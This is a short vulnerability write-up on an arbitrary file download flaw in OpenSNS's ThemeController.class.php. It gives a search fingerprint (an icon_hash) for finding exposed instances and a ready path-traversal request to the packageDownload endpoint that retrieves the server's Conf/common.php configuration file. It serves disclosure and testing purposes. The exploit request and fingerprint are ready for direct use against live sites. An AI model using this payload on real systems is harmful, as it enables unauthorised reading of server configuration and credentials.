# OpenSNS ThemeController.class.php A vulnerability to download any file in the background

## Vulnerability Description

File downloads exist in the OpenSNS ThemeController.class.php file, where insufficient filtering results in downloading any file on the server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">OpenSNS</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">icon_hash="1167011145"</span>

## Vulnerability reappears

The login page is as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235703575.png)

The vulnerable file is `Application/Admin/Model/ThemeController.class.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634373152099-96ada529-b284-4aae-9a04-877693d8cfbf.png)	

The theme parameter is a user-controllable parameter. According to the function process, it can be found that the existing file will be packaged as a zip file for download.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634373562017-e7805233-165a-4e99-b12b-9ef7d0be3508.png)

Construct request

```php
POST /admin.php?s=/theme/packageDownload

theme=../Conf/common.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634374149802-424a321a-71f3-404a-9397-9a1f3085b9f3.png)